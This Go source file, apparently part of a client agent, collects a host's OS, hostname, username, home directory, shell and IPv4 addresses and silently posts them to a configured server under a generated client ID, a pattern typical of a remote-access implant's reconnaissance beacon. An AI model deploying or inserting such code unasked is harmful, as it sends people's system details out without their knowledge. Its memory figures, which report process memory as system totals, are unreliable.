package systeminfo

import (
	"bytes"
	"client/config"
	"client/utils"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
)

type SystemInfo struct {
	OS          string `json:"os"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	HomeDir     string `json:"home_dir"`
	Shell       string `json:"shell"`
	CPUInfo     string `json:"cpu_info"`
	MemoryInfo  string `json:"memory_info"`
	DiskInfo    string `json:"disk_info"`
	NetworkInfo string `json:"network_info"`
}

func Systeminfo() {
	info := &SystemInfo{
		OS:       runtime.GOOS,
		Hostname: getHostname(),
		Username: getUsername(),
		HomeDir:  getHomeDir(),
		Shell:    getShell(),
	}

	// Get System Info
	info.CPUInfo = getCPUInfo()
	info.MemoryInfo = getMemoryInfo()
	info.DiskInfo = getDiskInfo()
	info.NetworkInfo = getNetworkInfo()

	// Send System Info
	sendSystemInfo(info)
}

func getCPUInfo() string {
	return fmt.Sprintf("CPU Cores: %d, Architecture: %s", runtime.NumCPU(), runtime.GOARCH)
}

func getMemoryInfo() string {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return fmt.Sprintf("Total: %.2f GB, Used: %.2f GB",
		float64(m.Sys)/1024/1024/1024,
		float64(m.Alloc)/1024/1024/1024)
}

func getNetworkInfo() string {
	var networkInfo strings.Builder

	// Get all network interfaces
	interfaces, err := net.Interfaces()
	if err != nil {
		return "unknown"
	}

	for _, iface := range interfaces {
		// Skip loopback interfaces
		if iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		// Skip down interfaces
		if iface.Flags&net.FlagUp == 0 {
			continue
		}

		// Get IP addresses
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			// Parse IP from CIDR format
			ipnet, ok := addr.(*net.IPNet)
			if !ok {
				continue
			}

			// Skip IPv6, only IPv4
			if ipnet.IP.To4() == nil {
				continue
			}

			networkInfo.WriteString(fmt.Sprintf("Interface: %s, IP: %s\n",
				iface.Name,
				ipnet.IP.String()))
		}
	}

	if networkInfo.Len() == 0 {
		return "No network interfaces found"
	}

	return networkInfo.String()
}

// Other helper functions remain the same
func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func getUsername() string {
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	return username
}

func getHomeDir() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return "unknown"
	}
	return home
}

func getShell() string {
	shell := os.Getenv("SHELL")
	if shell == "" {
		if runtime.GOOS == "windows" {
			return "cmd.exe"
		}
	}
	return shell
}

func sendSystemInfo(info *SystemInfo) {

	clientID := utils.GenerateClientID()

	data := struct {
		ClientID string      `json:"client_id"`
		Type     string      `json:"type"`
		Data     *SystemInfo `json:"data"`
	}{
		ClientID: clientID,
		Type:     "systeminfo",
		Data:     info,
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		return
	}

	serverURL := fmt.Sprintf("https://%s:%s/data", config.SERVER_IP, config.SERVER_PORT)
	req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}

	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Content-Type", "application/json")

	client := utils.HTTPClientConfig()
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
